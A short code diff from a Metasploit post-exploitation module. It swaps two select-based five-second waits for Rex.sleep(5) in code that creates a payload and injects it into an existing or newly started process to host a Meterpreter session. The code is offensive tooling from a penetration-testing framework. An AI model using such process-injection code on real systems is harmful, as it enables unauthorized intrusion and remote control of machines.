@@ -65,13 +65,13 @@ class Metasploit3 < Msf::Post
       if a[1]
         payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
         inject(a[1],payload)
-        select(nil, nil, nil, 5)
+        Rex.sleep(5)
       else
         # if no PID we create a process to host the Meterpreter session
         payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
         pid_num = start_proc(datastore['PROCESSNAME'])
         inject(pid_num,payload)
-        select(nil, nil, nil, 5)
+        Rex.sleep(5)
       end
     end
   end
